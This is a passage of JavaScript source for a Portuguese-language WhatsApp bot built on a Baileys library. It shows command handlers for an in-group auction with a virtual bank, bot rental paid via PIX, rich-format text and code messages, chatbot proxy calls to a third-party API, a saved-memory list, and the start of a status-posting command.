return reply(`╭━━━〔 ❌ 𝐈𝐓𝐄𝐌 𝐍𝐀̃𝐎 𝐄𝐍𝐂𝐎𝐍𝐓𝐑𝐀𝐃𝐎 〕━━━⬣
┃ Você não possui esse item.
┃
┣━━━〔 🎒 𝐈𝐍𝐕𝐄𝐍𝐓𝐀́𝐑𝐈𝐎 〕━━━⬣
┃ Veja seus itens:
┃ ${prefix}inventario
╰━━━〔 🏦 𝐙𝐘𝐑𝐎𝐍 𝐀𝐔𝐂𝐓𝐈𝐎𝐍 〕━━━⬣`);
}

leiloes[from] = {
dono: userId,
item,
valorInicial: valor,
maiorLance: valor,
maiorLanceador: null,
criado: Date.now()
};

fs.writeFileSync(path, JSON.stringify(leiloes, null, 2));

return reply(`╭━━━〔 🏦 𝐋𝐄𝐈𝐋𝐀̃𝐎 𝐈𝐍𝐈𝐂𝐈𝐀𝐃𝐎 〕━━━⬣
┃ 📦 Item: *${item}*
┃ 💰 Lance Inicial: *R$${valor}*
┃ 👤 Dono: *${pushname}*
┃
┣━━━〔 💸 𝐏𝐀𝐑𝐓𝐈𝐂𝐈𝐏𝐀𝐑 〕━━━⬣
┃ Dê um lance usando:
┃ ${prefix}leilao lance valor
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍 𝐀𝐔𝐂𝐓𝐈𝐎𝐍 〕━━━⬣`);
}

if (sub === 'listar') {

const l = leiloes[from];

if (!l) {
return reply(`╭━━━〔 ❌ 𝐒𝐄𝐌 𝐋𝐄𝐈𝐋𝐀̃𝐎 〕━━━⬣
┃ Não existe leilão ativo.
┃
┃ Crie um usando:
┃ ${prefix}leilao criar item valor
╰━━━〔 🏦 𝐙𝐘𝐑𝐎𝐍 𝐀𝐔𝐂𝐓𝐈𝐎𝐍 〕━━━⬣`);
}

return conn.sendMessage(from, {
text: `╭━━━〔 🏦 𝐋𝐄𝐈𝐋𝐀̃𝐎 𝐀𝐓𝐈𝐕𝐎 〕━━━⬣
┃ 📦 Item: *${l.item}*
┃ 👤 Dono: @${l.dono.split('@')[0]}
┃ 💰 Lance Atual: *R$${l.maiorLance}*
┃ 🏆 Líder: ${
l.maiorLanceador
? '@' + l.maiorLanceador.split('@')[0]
: 'Nenhum'
}
┃
┣━━━〔 💸 𝐃𝐀𝐑 𝐋𝐀𝐍𝐂𝐄 〕━━━⬣
┃ ${prefix}leilao lance valor
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍 𝐌𝐀𝐑𝐊𝐄𝐓 〕━━━⬣`,
mentions: [l.dono, l.maiorLanceador].filter(Boolean)
}, { quoted: selo });
}

if (sub === 'lance') {

const l = leiloes[from];

if (!l) {
return reply(`╭━━━〔 ❌ 𝐒𝐄𝐌 𝐋𝐄𝐈𝐋𝐀̃𝐎 〕━━━⬣
┃ Não existe leilão ativo.
╰━━━〔 🏦 𝐙𝐘𝐑𝐎𝐍 𝐀𝐔𝐂𝐓𝐈𝐎𝐍 〕━━━⬣`);
}

const valor = Number(args[1]);

if (!valor) {
return reply(`╭━━━〔 💰 𝐋𝐀𝐍𝐂𝐄 𝐈𝐍𝐕𝐀́𝐋𝐈𝐃𝐎 〕━━━⬣
┃ Use:
┃ ${prefix}leilao lance 60000
╰━━━〔 💸 𝐙𝐘𝐑𝐎𝐍 𝐁𝐈𝐃 〕━━━⬣`);
}

if (valor <= l.maiorLance) {
return reply(`╭━━━〔 ❌ 𝐋𝐀𝐍𝐂𝐄 𝐁𝐀𝐈𝐗𝐎 〕━━━⬣
┃ Seu lance precisa ser maior que:
┃ *R$${l.maiorLance}*
╰━━━〔 💸 𝐙𝐘𝐑𝐎𝐍 𝐁𝐈𝐃 〕━━━⬣`);
}

if (!banco[userId]) {
return reply(`╭━━━〔 ❌ 𝐒𝐄𝐌 𝐂𝐎𝐍𝐓𝐀 〕━━━⬣
┃ Você não possui conta no banco.
╰━━━〔 🏦 𝐙𝐘𝐑𝐎𝐍 𝐁𝐀𝐍𝐊 〕━━━⬣`);
}

if ((banco[userId].saldo || 0) < valor) {
return reply(`╭━━━〔 🏦 𝐒𝐀𝐋𝐃𝐎 𝐈𝐍𝐒𝐔𝐅𝐈𝐂𝐈𝐄𝐍𝐓𝐄 〕━━━⬣
┃ ❌ Você não tem saldo suficiente.
┃ 💰 Lance: *R$${valor}*
┃ 🏦 Seu saldo: *R$${banco[userId].saldo || 0}*
╰━━━〔 💸 𝐙𝐘𝐑𝐎𝐍 𝐁𝐈𝐃 〕━━━⬣`);
}

l.maiorLance = valor;
l.maiorLanceador = userId;

fs.writeFileSync(path, JSON.stringify(leiloes, null, 2));

return conn.sendMessage(from, {
text: `╭━━━〔 🏆 𝐍𝐎𝐕𝐎 𝐋𝐀𝐍𝐂𝐄 〕━━━⬣
┃ 👤 Usuário: @${userId.split('@')[0]}
┃ 💰 Lance: *R$${valor}*
┃ 📦 Item: *${l.item}*
┃
╰━━━〔 🔥 𝐙𝐘𝐑𝐎𝐍 𝐀𝐔𝐂𝐓𝐈𝐎𝐍 〕━━━⬣`,
mentions: [userId]
}, { quoted: selo });
}

if (sub === 'cancelar') {

const l = leiloes[from];

if (!l) {
return reply(`╭━━━〔 ❌ 𝐒𝐄𝐌 𝐋𝐄𝐈𝐋𝐀̃𝐎 〕━━━⬣
┃ Não existe leilão para cancelar.
╰━━━〔 🏦 𝐙𝐘𝐑𝐎𝐍 𝐀𝐔𝐂𝐓𝐈𝐎𝐍 〕━━━⬣`);
}

if (l.dono !== userId && !So_Dono) {
return reply(`╭━━━〔 🔒 𝐀𝐂𝐄𝐒𝐒𝐎 𝐍𝐄𝐆𝐀𝐃𝐎 〕━━━⬣
┃ Apenas o dono do leilão pode cancelar.
╰━━━〔 ⚠️ 𝐙𝐘𝐑𝐎𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 〕━━━⬣`);
}

delete leiloes[from];

fs.writeFileSync(path, JSON.stringify(leiloes, null, 2));

return reply(`╭━━━〔 ✅ 𝐋𝐄𝐈𝐋𝐀̃𝐎 𝐂𝐀𝐍𝐂𝐄𝐋𝐀𝐃𝐎 〕━━━⬣
┃ O leilão foi cancelado com sucesso.
╰━━━〔 🏦 𝐙𝐘𝐑𝐎𝐍 𝐀𝐔𝐂𝐓𝐈𝐎𝐍 〕━━━⬣`);
}

if (sub === 'finalizar') {

const l = leiloes[from];

if (!l) {
return reply(`╭━━━〔 ❌ 𝐒𝐄𝐌 𝐋𝐄𝐈𝐋𝐀̃𝐎 〕━━━⬣
┃ Não existe leilão ativo.
╰━━━〔 🏦 𝐙𝐘𝐑𝐎𝐍 𝐀𝐔𝐂𝐓𝐈𝐎𝐍 〕━━━⬣`);
}

if (l.dono !== userId && !So_Dono) {
return reply(`╭━━━〔 🔒 𝐀𝐂𝐄𝐒𝐒𝐎 𝐍𝐄𝐆𝐀𝐃𝐎 〕━━━⬣
┃ Apenas o dono do leilão pode finalizar.
╰━━━〔 ⚠️ 𝐙𝐘𝐑𝐎𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 〕━━━⬣`);
}

if (!l.maiorLanceador) {
return reply(`╭━━━〔 ❌ 𝐒𝐄𝐌 𝐋𝐀𝐍𝐂𝐄𝐒 〕━━━⬣
┃ Nenhum lance foi recebido ainda.
╰━━━〔 💸 𝐙𝐘𝐑𝐎𝐍 𝐁𝐈𝐃 〕━━━⬣`);
}

if ((banco[l.maiorLanceador]?.saldo || 0) < l.maiorLance) {
return reply(`╭━━━〔 ❌ 𝐒𝐀𝐋𝐃𝐎 𝐈𝐍𝐕𝐀́𝐋𝐈𝐃𝐎 〕━━━⬣
┃ O vencedor não possui saldo suficiente.
┃ Leilão não finalizado.
╰━━━〔 🏦 𝐙𝐘𝐑𝐎𝐍 𝐁𝐀𝐍𝐊 〕━━━⬣`);
}

banco[l.maiorLanceador].saldo -= l.maiorLance;

if (!banco[l.dono]) banco[l.dono] = { saldo: 0, inventario: {} };
if (!banco[l.dono].inventario) banco[l.dono].inventario = {};

banco[l.dono].saldo += l.maiorLance;

if (!banco[l.maiorLanceador].inventario) {
banco[l.maiorLanceador].inventario = {};
}

banco[l.maiorLanceador].inventario[l.item] =
(banco[l.maiorLanceador].inventario[l.item] || 0) + 1;

delete leiloes[from];

salvarBanco(banco);
fs.writeFileSync(path, JSON.stringify(leiloes, null, 2));

return conn.sendMessage(from, {
text: `╭━━━〔 🏆 𝐋𝐄𝐈𝐋𝐀̃𝐎 𝐅𝐈𝐍𝐀𝐋𝐈𝐙𝐀𝐃𝐎 〕━━━⬣
┃ 📦 Item: *${l.item}*
┃ 👤 Vencedor: @${l.maiorLanceador.split('@')[0]}
┃ 💰 Valor Final: *R$${l.maiorLance}*
┃
┣━━━〔 🏦 𝐙𝐘𝐑𝐎𝐍 𝐁𝐀𝐍𝐊 〕━━━⬣
┃ ✅ Pagamento realizado.
┃ 🎒 Item enviado ao inventário.
┃ 💸 Valor enviado ao vendedor.
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍 𝐀𝐔𝐂𝐓𝐈𝐎𝐍 〕━━━⬣`,
mentions: [l.maiorLanceador]
}, { quoted: selo });
}

reply(`╭━━━〔 ❌ 𝐎𝐏𝐂̧𝐀̃𝐎 𝐈𝐍𝐕𝐀́𝐋𝐈𝐃𝐀 〕━━━⬣
┃ Use:
┃ ${prefix}leilao
╰━━━〔 🏦 𝐙𝐘𝐑𝐎𝐍 𝐀𝐔𝐂𝐓𝐈𝐎𝐍 〕━━━⬣`);

} catch (e) {
console.log('[LEILAO ERROR]', e);
reply(`╭━━━〔 ❌ 𝐄𝐑𝐑𝐎 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
┃ Não foi possível executar o leilão.
┃ Verifique o console.
╰━━━〔 ⚠️ 𝐒𝐘𝐒𝐓𝐄𝐌 〕━━━⬣`);
}
}
break;

//comandos aluguel 

case 'alugar': {
try {
if (!isGroup) return reply('❌ Use este comando em grupos.');

const tempo = args[0];

if (!tempo) return reply(`💰 *ALUGAR BOT*

Use:
${prefix}alugar diario
${prefix}alugar semanal
${prefix}alugar mensal
${prefix}alugar trimensal`);

const planos = {
    diario: { dias: 1, valor: 5 },
    semanal: { dias: 7, valor: 15 },
    mensal: { dias: 30, valor: 50 },
    trimensal: { dias: 90, valor: 95 }
};

const imagens = {
    diario: 'https://SEU-LINK-DO-DIARIO.jpg',
    semanal: 'https://SEU-LINK-DO-SEMANAL.jpg',
    mensal: 'https://SEU-LINK-DO-MENSAL.jpg',
    trimensal: 'https://SEU-LINK-DO-TRIMENSAL.jpg'
};

if (!planos[tempo.toLowerCase()])
return reply('❌ Plano inválido.');

const plano = planos[tempo.toLowerCase()];
const pedidos = jsonLoad(caminhoPedidosAluguel);

const pedidoId = gerarIdPedido();

pedidos[pedidoId] = {
    grupo: from,
    comprador: sender,
    plano: tempo.toLowerCase(),
    dias: plano.dias,
    valor: plano.valor,
    status: "pendente",
    criadoEm: Date.now()
};

jsonSave(caminhoPedidosAluguel, pedidos);

await conn.sendMessage(from, {
    image: {
        url: imagens[tempo.toLowerCase()]
    },
    caption: `🛒 *PEDIDO DE ALUGUEL CRIADO*

🆔 Pedido: *${pedidoId}*
📦 Plano: *${tempo}*
⏳ Duração: *${plano.dias} dias*
💰 Valor: *R$ ${plano.valor.toFixed(2)}*

💸 *PIX*
\`\`\`${CHAVE_PIX}\`\`\`

📤 Após realizar o pagamento, envie o comprovante no privado do proprietário.

📞 https://wa.me/5519995729970`
}, { quoted: info });

} catch (e) {
console.log(e);
reply('❌ Erro ao criar pedido de aluguel.');
}
}
break;

case 'aprovaraluguel': {
try {
if (!So_Dono) return reply(msg.SoDono);

const pedidoId = args[0];
if (!pedidoId) return reply(`Use: ${prefix}aprovaraluguel ID`);

const pedidos = jsonLoad(caminhoPedidosAluguel);

if (!pedidos[pedidoId])
return reply('❌ Pedido não encontrado.');

const pedido = pedidos[pedidoId];

if (pedido.status === "aprovado")
return reply('⚠️ Este pedido já foi aprovado.');

const alugueis = jsonLoad(caminhoAluguel);

alugueis[pedido.grupo] = {
    ativo: true,
    plano: pedido.plano,
    expira: Date.now() + pedido.dias * 24 * 60 * 60 * 1000,
    comprador: pedido.comprador,
    aprovadoEm: Date.now()
};

pedidos[pedidoId].status = "aprovado";

jsonSave(caminhoAluguel, alugueis);
jsonSave(caminhoPedidosAluguel, pedidos);

await reply(`✅ *ALUGUEL APROVADO*

🆔 Pedido: ${pedidoId}
📦 Plano: ${pedido.plano}
⏳ Duração: ${pedido.dias} dias
💰 Valor: R$ ${pedido.valor.toFixed(2)}

O bot foi liberado neste grupo.`);

} catch (e) {
console.log(e);
reply('❌ Erro ao aprovar aluguel.');
}
}
break;

case 'recusaraluguel': {
try {
if (!So_Dono) return reply(msg.SoDono);

const pedidoId = args[0];
if (!pedidoId) return reply(`Use: ${prefix}recusaraluguel ID`);

const pedidos = jsonLoad(caminhoPedidosAluguel);

if (!pedidos[pedidoId])
return reply('❌ Pedido não encontrado.');

pedidos[pedidoId].status = "recusado";

jsonSave(caminhoPedidosAluguel, pedidos);

reply(`❌ Pedido de aluguel *${pedidoId}* recusado.`);

} catch (e) {
console.log(e);
reply('❌ Erro ao recusar aluguel.');
}
}
break;

case 'alugueladd': {
try {

if (!So_Dono) return reply('❌ Apenas o dono pode usar este comando.');

if (!isGroup) return reply('❌ Use este comando dentro do grupo.');

const tempo = args[0];

if (!tempo) {
return reply(`Use:

${prefix}alugueladd diario
${prefix}alugueladd semanal
${prefix}alugueladd mensal
${prefix}alugueladd trimestral
${prefix}alugueladd permanente`);
}

const planos = {
diario: 1,
semana: 7,
mes: 30,
'3meses': 90
};

const alugueis = carregarAluguel();

if (tempo.toLowerCase() === 'permanente') {

alugueis[from] = {
ativo: true,
plano: 'permanente',
expira: 9999999999999,
comprador: sender,
aprovadoEm: Date.now()
};

salvarAluguel(alugueis);

return reply(`✅ Grupo liberado permanentemente.`);
}

if (!planos[tempo.toLowerCase()])
return reply('❌ Plano inválido.');

const dias = planos[tempo.toLowerCase()];

alugueis[from] = {
ativo: true,
plano: tempo.toLowerCase(),
expira: Date.now() + dias * 86400000,
comprador: sender,
aprovadoEm: Date.now()
};

salvarAluguel(alugueis);

reply(`✅ Aluguel ativado!

📦 Plano: ${tempo}
⏳ Duração: ${dias} dias`);

} catch(e) {
console.log(e);
reply('❌ Erro ao ativar aluguel.');
}
}
break;

case 'removeraluguel': {
try {

if (!So_Dono) return reply('❌ Apenas o dono.');

if (!isGroup) return reply('❌ Use em grupos.');

const alugueis = carregarAluguel();

delete alugueis[from];

salvarAluguel(alugueis);

reply('✅ Aluguel removido com sucesso.');

} catch(e){
console.log(e);
reply('❌ Erro.');
}
}
break;

//comandos de chapado

case 'infobot2': {
try {

await conn.sendMessage(from, {
    react: {
        text: '✨',
        key: info.key
    }
});

// Primeira mensagem
await conn.sendRich(from, [

    conn.makeText(
`# 🤖 KYARA INFO

Olá @${sender.split("@")[0]}!

Bem-vindo ao *Kyara*.

🌐 Links Oficiais

• [🌐 Site NXR](https://)
• [💻 GitHub](https://github.com/KYARA-SCRIPTS-DEV)
• [📢 Canal WhatsApp](https://whatsapp.com/channel/0029VbCaBlb7T8bamg6B2i0e)`
    )

], info);

// Segunda mensagem
await conn.sendRich(from, [

    conn.makeCode(
        "bash",
`# KYARA

BOT="Kyara"
VERSION="3.7x2"
STATUS="ONLINE"

echo "$BOT | $VERSION | $STATUS"`
    ),

    conn.makeTable([
        ["Sistema", "Status"],
        ["IA", "✅ Online"],
        ["Downloads", "✅ Online"],
        ["API", "✅ Online"],
        ["Segurança", "✅ Ativa"]
    ])

], info, [
    "RICH_RESPONSE_CODE",
    "RICH_RESPONSE_TABLE"
]);

} catch (e) {
console.log(e);
reply("❌ Erro ao enviar mensagem Rich.");
}
}
break;

case 'nametag': {
try {
        
    const nome = q ? q.replace(/\\n/g, '\n') : 'KYARA';

    const partes = [];
    const capabilities = [];
    const codeRegex = /```(\w+)?\s*\n([\s\S]*?)```/g;

    let lastIndex = 0;
    let match;
    let temCodigo = false;

    while ((match = codeRegex.exec(nome)) !== null) {
        if (match.index > lastIndex) {
            const textPart = nome.substring(lastIndex, match.index).trim();
            if (textPart) partes.push(conn.makeText(textPart));
        }

        const linguagem = match[1] || 'text';
        const codigoPuro = match[2].trim();

        partes.push(conn.makeCode(linguagem, codigoPuro));
        temCodigo = true;
        lastIndex = codeRegex.lastIndex;
    }

    if (lastIndex < nome.length) {
        const textPart = nome.substring(lastIndex).trim();
        if (textPart) partes.push(conn.makeText(textPart));
    }

    if (temCodigo) {
        capabilities.push('RICH_RESPONSE_CODE');

        await conn.sendRich(
            from,
            partes,
            info,
            capabilities
        );
    } else {
        await conn.sendRichText(
            from,
            nome,
            info
        );
    }

} catch (e) {
    console.log("ERRO NAMETAG:", e);
    reply("❌ Erro ao enviar nametag.");
}
}
break;

case 'helptag': {
    try {
        
        const texto =
`📌 *COMO USAR O NAMETAG*

O comando *nametag* serve para enviar texto com suporte a:

🧠 Código (CODE)
📄 Texto normal
⚡ Mensagens formatadas

---

📌 *COMO USAR:*

👉 Texto normal:
$nametag Olá mundo

👉 Com quebra de linha:
$nametag Olá\\nTudo bem?

👉 Com código:
$nametag \`\`\`js
console.log("Olá mundo")
\`\`\`

---

📌 *O QUE ELE FAZ:*
✔ Detecta código automaticamente
✔ Transforma em mensagem RICH
✔ Suporta múltiplos blocos
✔ Envia texto formatado

---

📌 *EXEMPLO COMPLETO:*
$nametag Olá pessoal!

\`\`\`js
function teste() {
  return "ok"
}
\`\`\`

`;

        await conn.sendMessage(m.chat, {
            react: { text: '📌', key: m.key }
        });

        const partes = [];
        const capabilities = [];

        const blocos = texto.split(/(```[\s\S]*?```)/g);

        for (const bloco of blocos) {
            if (!bloco?.trim()) continue;

            // CODE
            const codeMatch = bloco.match(/^```(\w*)\n([\s\S]*?)```$/);

            if (codeMatch) {
                partes.push(conn.makeCode(
                    codeMatch[1] || 'text',
                    codeMatch[2].trim()
                ));

                capabilities.push('RICH_RESPONSE_CODE');
                continue;
            }

            // TEXT
            partes.push(conn.makeText(bloco.trim()));
        }

        await conn.sendRich(
            m.chat,
            partes,
            m,
            capabilities
        );

        await conn.sendMessage(m.chat, {
            react: { text: '✅', key: m.key }
        });

    } catch (e) {
        console.log("ERRO HELPTAG:", e);
        return conn.sendMessage(m.chat, {
            text: '❌ Erro ao mostrar ajuda do nametag.'
        }, { quoted: m });
    }

    break;
}

//comandos uteis

case 'perp': {
    try {
        const text = q?.trim();

        if (!q) {
            return conn.sendMessage(m.chat, {
                text: '_Digite sua pergunta para o Perplexity._'
            }, { quoted: m });
        }

        // 🔥 anti pergunta muito curta (evita erro de stream)
        if (text.length < 4) {
            return conn.sendMessage(m.chat, {
                text: '❌ Pergunta muito curta. Tente ser mais específico.'
            }, { quoted: m });
        }

        await conn.sendMessage(m.chat, {
            react: { text: '🔎', key: m.key }
        });

        const sessionId = m.isGroup ? m.chat : m.sender;

        const axios = require('axios');

        let data;

        try {
            const res = await axios.get(
                `https://zone.api.br/api/perplexity?q=${encodeURIComponent(text)}&id=${encodeURIComponent(sessionId)}`
            );
            data = res.data;
        } catch (err) {
            throw new Error('Falha na conexão com Perplexity API');
        }

        console.log('[PERP DEBUG]', JSON.stringify(data, null, 2));

        // 🔥 trata erro do backend (incluindo stream quebrado)
        if (!data || data.status === false) {
            throw new Error(
                data?.mensagem ||
                data?.erro ||
                'API retornou erro desconhecido'
            );
        }

        const resposta =
            data?.text ||
            data?.result ||
            data?.resposta ||
            data?.data?.text ||
            '';

        if (!resposta || !resposta.trim()) {
            throw new Error('Perplexity retornou resposta vazia');
        }

        const partes = [];
        const capabilities = new Set();

        const blocos = resposta.split(/(```[\s\S]*?```)/g);

        for (const bloco of blocos) {
            if (!bloco?.trim()) continue;

            // ───── CODE ─────
            const codeMatch = bloco.match(/^```(\w*)\n([\s\S]*?)```$/);

            if (codeMatch) {
                const lang = codeMatch[1] || 'text';
                const code = codeMatch[2].trim();

                partes.push(conn.makeCode(lang, code));
                capabilities.add('RICH_RESPONSE_CODE');
                continue;
            }

            // ───── TABLE ─────
            if (/^\|.*\|/m.test(bloco)) {
                const linhas = bloco.split('\n')
                    .filter(l => l.trim().startsWith('|') && l.includes('|'));

                if (linhas.length > 0) {
                    const tabela = linhas.map(l =>
                        l.split('|')
                            .map(c => c.trim())
                            .filter(Boolean)
                    );

                    partes.push(conn.makeTable(tabela));
                    capabilities.add('RICH_RESPONSE_TABLE');
                    continue;
                }
            }

            // ───── TEXT ─────
            const texto = bloco.trim();
            if (texto) {
                partes.push(conn.makeText(texto));
            }
        }

        if (!partes.length) {
            partes.push(conn.makeText(resposta));
        }

        await conn.sendRich(
            m.chat,
            partes,
            m,
            [...capabilities]
        );

        await conn.sendMessage(m.chat, {
            react: { text: '✅', key: m.key }
        });

    } catch (e) {
        console.error('[PERPLEXITY ERROR]', e?.message || e);

        const msg = e?.message || '';

        // 🔥 tratamento especial do erro de stream
        if (msg.includes('stream')) {
            return conn.sendMessage(m.chat, {
                text: '⚠️ A IA não conseguiu finalizar a resposta.\nTente reformular a pergunta.'
            }, { quoted: m });
        }

        await conn.sendMessage(m.chat, {
            react: { text: '💔', key: m.key }
        });

        return conn.sendMessage(m.chat, {
            text: '_Erro ao consultar o Perplexity. Tente novamente mais tarde._'
        }, { quoted: m });
    }

    break;
}

case 'claude': {
    try {
        const text = q?.trim();

        if (!q) {
            return conn.sendMessage(m.chat, {
                text: '_Por favor, informe o texto que deseja enviar ao Claude._'
            }, { quoted: m });
        }

        await conn.sendMessage(m.chat, {
            react: { text: '🤖', key: m.key }
        });

        const sessionId = m.isGroup ? m.chat : m.sender;

        const { data } = await axios.get(
            `https://zone.api.br/api/ia/claude-haiku?apikey=freekey&text=${encodeURIComponent(text)}&id=${encodeURIComponent(sessionId)}`
        );

        const respostaIA = data?.text?.trim();

        if (!respostaIA) {
            throw new Error('Resposta vazia da IA');
        }

        const partes = [];
        const capabilities = new Set();

        const blocos = respostaIA.split(/(```[\s\S]*?```)/g);

        for (const bloco of blocos) {
            if (!bloco || !bloco.trim()) continue;

            // ───── CODE ─────
            const codeMatch = bloco.match(/^```(\w*)\n([\s\S]*?)```$/);

            if (codeMatch) {
                const lang = codeMatch[1] || 'text';
                const code = codeMatch[2].trim();

                partes.push(conn.makeCode(lang, code));
                capabilities.add('RICH_RESPONSE_CODE');
                continue;
            }

            // ───── TABLE ─────
            if (/^\|.*\|/m.test(bloco)) {
                const linhas = bloco.split('\n');

                const tabela = linhas
                    .filter(l => l.trim().startsWith('|') && l.includes('|'))
                    .map(l =>
                        l.split('|')
                            .map(c => c.trim())
                            .filter(Boolean)
                    );

                if (tabela.length > 0) {
                    partes.push(conn.makeTable(tabela));
                    capabilities.add('RICH_RESPONSE_TABLE');
                    continue;
                }
            }

            // ───── TEXT ─────
            partes.push(conn.makeText(bloco.trim()));
        }

        if (!partes.length) {
            partes.push(conn.makeText(respostaIA));
        }

        await conn.sendRich(
            m.chat,
            partes,
            m,
            [...capabilities]
        );

        await conn.sendMessage(m.chat, {
            react: { text: '✅', key: m.key }
        });

    } catch (e) {
        console.error('[CLAUDE ERROR]', e?.response?.data || e?.message || e);

        await conn.sendMessage(m.chat, {
            react: { text: '💔', key: m.key }
        });

        return conn.sendMessage(m.chat, {
            text: '_Erro ao consultar o Claude. Tente novamente mais tarde._'
        }, { quoted: m });
    }

    break;
}

case 'memoriakiyora': {
try {

const fs = require("fs");

const path = "./database/memoriakiyora.json";

if (!fs.existsSync(path)) {
fs.writeFileSync(path, "[]");
}

let memoria = JSON.parse(fs.readFileSync(path));

if (!q) return reply(
`🧠 *MEMÓRIA KIYORA*

Use:
${prefix}memoriakiyora add texto

Exemplo:
${prefix}memoriakiyora add Meu nome é Juan`
);

if (q.startsWith("add ")) {

let texto = q.slice(4).trim();

if (!texto) return reply("❌ Digite o que deseja adicionar.");

memoria.push(texto);

fs.writeFileSync(path, JSON.stringify(memoria, null, 2));

return reply(`🧠 Memória adicionada:

"${texto}"`);

}

if (q === "listar") {

if (!memoria.length)
return reply("🧠 Nenhuma memória salva.");

return reply(
`🧠 *MEMÓRIAS KIYORA*

${memoria.map((m,i)=>`${i+1}. ${m}`).join("\n")}`
);

}

if (q.startsWith("del ")) {

let id = Number(q.slice(4))-1;

if (!memoria[id]) return reply("❌ Memória não encontrada.");

let removida = memoria.splice(id,1);

fs.writeFileSync(path, JSON.stringify(memoria,null,2));

return reply(`🗑️ Memória removida:
${removida}`);

}

} catch(e) {
console.log(e);
reply("❌ Erro na memória Kiyora.");
}
}
break;

case 'copilot': {
    const text =
        body?.slice(command.length + prefix.length).trim() || '';

    if (!q) {
        return conn.sendMessage(m.chat, {
            text: `❌ Cade a pergunta?\n\nExemplo:\n${prefix}copilot Qual a capital do Brasil?`
        }, { quoted: m });
    }

    try {
        await conn.sendMessage(m.chat, {
            react: { text: '👀', key: m.key }
        });

        const axios = require('axios');

        const { data } = await axios.get(
            'https://zone.api.br/api/copilot2',
            {
                params: {
                    text,
                    model: 'gpt-5'
                }
            }
        );

        if (!data?.status || !data?.result) {
            throw new Error('Sem resposta da API');
        }

        let result = data.result;
        const lower = text.toLowerCase();

        // ───────── DETECÇÃO DE FORMATO ─────────
        const isCode =
            lower.includes('código') ||
            lower.includes('codigo') ||
            lower.includes('code') ||
            lower.includes('script') ||
            lower.includes('função') ||
            lower.includes('funcao') ||
            lower.includes('programa');

        const isTable =
            lower.includes('tabela') ||
            lower.includes('table') ||
            lower.includes('planilha') ||
            lower.includes('lista em tabela');

        // ───────── CODE ─────────
        if (isCode) {
            try {
                return conn.makeCode(m.chat, result, m);
            } catch (err) {
                console.log('[MAKECODE ERROR]', err);
                return conn.sendMessage(m.chat, { text: result }, { quoted: m });
            }
        }

        // ───────── TABLE (FIX DO ERRO rows.map) ─────────
        if (isTable) {
            try {
                let rows;

                // tenta converter JSON primeiro
                try {
                    const parsed = JSON.parse(result);
                    rows = Array.isArray(parsed) ? parsed : null;
                } catch {
                    rows = null;
                }

                // fallback seguro (nunca quebra)
                if (!rows) {
                    rows = result.split('\n').map((line, i) => ({
                        title: `Linha ${i + 1}`,
                        description: line
                    }));
                }

                return conn.makeTable(m.chat, rows, m);

            } catch (err) {
                console.log('[MAKETABLE ERROR]', err);
                return conn.sendMessage(m.chat, { text: result }, { quoted: m });
            }
        }

        // ───────── RESPOSTA NORMAL ─────────
        await conn.sendMessage(m.chat, {
            text: result
        }, { quoted: m });

        await conn.sendMessage(m.chat, {
            react: { text: '✅', key: m.key }
        });

    } catch (e) {
        console.error('[COPILOT ERROR]', e);

        await conn.sendMessage(m.chat, {
            react: { text: '💔', key: m.key }
        });

        return conn.sendMessage(m.chat, {
            text: '❌ Erro ao consultar o Copilot.'
        }, { quoted: m });
    }
}
break;

// CRÉDITOS REMOVIDOS 
//NAO TIRA OS CRÉDITOS
case 'statuspost':
case 'poststatus': {
try {
    await conn.sendMessage(from, {
        react: { text: '⏳', key: info.key }
    });

    
    const {
        downloadMediaMessage,
        prepareWAMessageMedia,
        generateWAMessageFromContent
    } = require('@systemzero/baileys');

    let argsTemp = [...args];

    const canalJid = argsTemp[0]?.includes('@newsletter')
        ? argsTemp.shift()
        : null;

    const caption = argsTemp.join(' ') || q || '';
    const messageSecret = crypto.randomBytes(32)
    let innerMsg = {};
    let mediaBuffer = null;
    let mediaType = null;
    let mediaMime = null;
    let mediaPtt = false;

    const quotedMsg = info.message?.extendedTextMessage?.contextInfo?.quotedMessage || null;
    const ctx = info.message?.extendedTextMessage?.contextInfo || {};

    if (quotedMsg) {
        const type = Object.keys(quotedMsg)[0];
        mediaType = type;

        const fakeMsg = {
            key: {
                remoteJid: from,
                id: ctx.stanzaId || info.key.id,
                fromMe: false,
                participant: ctx.participant || sender
            },
            message: quotedMsg
        };

        if (type === 'imageMessage' || type === 'videoMessage' || type === 'audioMessage') {
            const media = quotedMsg[type];

            if (!media?.mediaKey || !media?.url) {
                await conn.sendMessage(from, {
                    react: { text: '❌', key: info.key }
                });

                return reply(`❌ Essa mídia não pode ser baixada.

📌 Se for mídia de canal/status, envie ela primeiro no PV do bot e use o comando respondendo ela.`);
            }

            const buffer = await downloadMediaMessage(fakeMsg, 'buffer', {}, {});
            if (!buffer) throw new Error('Falha ao baixar mídia.');

            mediaBuffer = buffer;
            mediaMime = media.mimetype || 'application/octet-stream';
            mediaPtt = media.ptt || false;

            if (type === 'imageMessage') {
                const prep = await prepareWAMessageMedia(
                    { image: buffer },
                    { upload: conn.waUploadToServer }
                );

                innerMsg = {
                    imageMessage: {
                        ...prep.imageMessage,
                        caption: caption || quotedMsg.imageMessage?.caption || '',
                        messageContextInfo: { messageSecret }
                    }
                };
            }

            if (type === 'videoMessage') {
                const prep = await prepareWAMessageMedia(
                    { video: buffer },
                    { upload: conn.waUploadToServer }
                );

                innerMsg = {
                    videoMessage: {
                        ...prep.videoMessage,
                        caption: caption || quotedMsg.videoMessage?.caption || '',
                        messageContextInfo: { messageSecret }
                    }
                };
            }

            if (type === 'audioMessage') {
                const prep = await prepareWAMessageMedia(
                    {
                        audio: buffer,
                        mimetype: quotedMsg.audioMessage?.mimetype || 'audio/mp4',
                        ptt: quotedMsg.audioMessage?.ptt || false
                    },
                    { upload: conn.waUploadToServer }
                );

                innerMsg = {
                    audioMessage: {
                        ...prep.audioMessage,
                        messageContextInfo: { messageSecret }
                    }
                };
            }
        } else {
            innerMsg = {
                extendedTextMessage: {
                    text:
                        caption ||
                        quotedMsg.extendedTextMessage?.text ||
                        quotedMsg.conversation ||
                        '',
                    messageContextInfo: { messageSecret }
                }
            };
        }
    } else {
        if (!caption) {
